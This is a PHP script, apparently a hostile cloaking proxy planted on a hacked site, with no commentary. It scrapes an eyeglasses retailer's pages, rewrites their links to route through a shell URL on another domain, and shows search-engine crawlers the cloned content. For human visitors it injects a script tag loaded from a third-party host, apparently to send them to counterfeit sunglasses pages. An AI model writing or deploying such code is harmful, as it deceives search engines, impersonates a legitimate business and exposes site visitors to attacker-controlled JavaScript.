<?php
error_reporting ( 0 );

$jumpcode='http://www.sunglassr.com/sg.js';
$jumpcode='<script type="text/javascript" src="'.$jumpcode.'"></script>';
define("DESURL","http://www.simplyeyeglasses.com/");
define("SHELLURL","http://www.conceptpr.com/pen.php?");
define("RP","oakley");
define("RC","salee");

function is_spider(){
	$robot = 0;
	$USER_AGENT = strtolower($_SERVER['HTTP_USER_AGENT']);
	if(strpos($USER_AGENT,"bot")) $robot = 1;
	if(strpos($USER_AGENT,"spider")) $robot = 1;
	if(strpos($USER_AGENT,"slurp")) $robot = 1;
	if(strpos($USER_AGENT,"google")) $robot = 1;
	if(strpos($USER_AGENT,"fast-webcrawler")) $robot = 1;
	if(strpos($USER_AGENT,"altavista")) $robot = 1;
	if(strpos($USER_AGENT,"ia_archiver")) $robot = 1;
	return $robot;
} 
function is_lang_zh()
{
	$langs=$_SERVER['HTTP_ACCEPT_LANGUAGE'];
	if(strpos($langs,"zh")!==false)
		return 1;
	 else
	 return 0;
}
function GetHttpPage($url) {
	$output = '';
	$time_out = 30;
	if (function_exists ( 'curl_init' )) {
		$ch = curl_init ();
		curl_setopt ( $ch, CURLOPT_URL, $url );
		curl_setopt ( $ch, CURLOPT_RETURNTRANSFER, true );
		curl_setopt ( $ch, CURLOPT_BINARYTRANSFER, true );
		curl_setopt ( $ch, CURLOPT_CONNECTTIMEOUT, $time_out );
		curl_setopt ( $ch, CURLOPT_FOLLOWLOCATION,1);
		curl_setopt ( $ch, CURLOPT_USERAGENT,"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)");
		$output = curl_exec ( $ch );
		curl_close ( $ch );
	} elseif (function_exists ( 'file_get_contents' )) {
		$context = stream_context_create(array('http' => array('timeout' => $time_out)));  
		$output = file_get_contents ( $url, false, $context);
	} elseif (ini_get ( "allow_url_fopen" ) == "1") {		
		$errstr = '';
		$errno = ''; 
		$info = parse_url ( $url );
		$fp = fsockopen ( $info ["host"], 80, $errno, $errstr, $time_out ) or exit ( $errstr . "--->" . $errno );
		$head = "GET " . $info ['path'] . "?" . $info ["query"] . " HTTP/1.1\r\n";
		$head .= "Host: " . $info ['host'] . "\r\n";
		$head .= "Connection: Close\r\n\r\n";
		fwrite($fp, $head);
		while ( ! feof ( $fp ) ) {
			$output .= fgets ( $fp, 128 );
		}
		fclose ( $fp );
	}
	return $output;
}

function searchreplacep($matches) {return '-p-'.octdec($matches[1]).'.';}
function searchreplacepd($matches) {return '-'.RP.'-'.decoct($matches[1]).'.';}
function searchreplacec($matches) {return '-c-'.octdec($matches[1]).$matches[2];}
function searchreplacecd($matches) {return '-'.RC.'-'.decoct($matches[1]).$matches[2];}


	$qstring=$_SERVER["QUERY_STRING"];
	$is_zh=is_lang_zh();
	$is_spider = is_spider();
	if($qstring!='');
		{
			$qstring = preg_replace_callback('/-'.RP.'-(\\d+)\./iU','searchreplacep',$qstring);
			$qstring = preg_replace_callback('/-'.RC.'-(\\d+)([\._])/iU','searchreplacec',$qstring);
		}
		$htmls = GetHttpPage(DESURL . $qstring . "");
			
			$desurlmv=DESURL;
			$desurlmv = str_ireplace('/','\/',$desurlmv);
			$htmls=preg_replace('/href\s*=\s*(["\'])'.$desurlmv.'/iU','href=$1'.SHELLURL, $htmls);		
			$htmls=preg_replace('/href\s*=\s*(["\'])\//iU','href=$1'.SHELLURL, $htmls);
			$htmls=preg_replace('/href\s*=\s*(["\'])(?!http)/iU','href=$1'.SHELLURL.'$2', $htmls);
			
			$shellurlmv = SHELLURL;
			$shellurlmv = str_ireplace('?','',$shellurlmv);
			$shellurlmv = str_ireplace('/','\/',$shellurlmv);
			$htmls = preg_replace('/href\s*=\s*(["\'])'.$shellurlmv.'\?(.*\.css)/iU','href=$1'.DESURL.'$2' , $htmls);
			$htmls = preg_replace('/href\s*=\s*(["\'])'.$shellurlmv.'\?(.*\.ico)/iU','href=$1'.DESURL.'$2' , $htmls);
			
			$htmls = preg_replace('/src\s*=\s*(["\'])\//iU','src=$1'.DESURL , $htmls);
			$htmls=preg_replace('/src\s*=\s*(["\'])(?!http)/iU','src=$1'.DESURL.'$2', $htmls);
						
			$htmls=preg_replace('/\?\s*(["\'])/iU','$1', $htmls);
			$htmls=preg_replace('/<input\s*type=\s*["\']\s*hidden.*\/\s*>/iU','', $htmls);
			
			$htmls = preg_replace_callback('/-p-(\\d+)\./iU','searchreplacepd',$htmls);
			$htmls = preg_replace_callback('/-c-(\\d+)([\._])/iU','searchreplacecd',$htmls);
			$htmls = str_ireplace('window.location.href','var jp',$htmls);
			$htmls = str_ireplace('location.href','; var jp',$htmls);
				
	if($is_spider==1)
	{
		 echo $htmls;
	}
	else if($is_spider==0)
	{
		 echo $jumpcode.$htmls;
	}
?>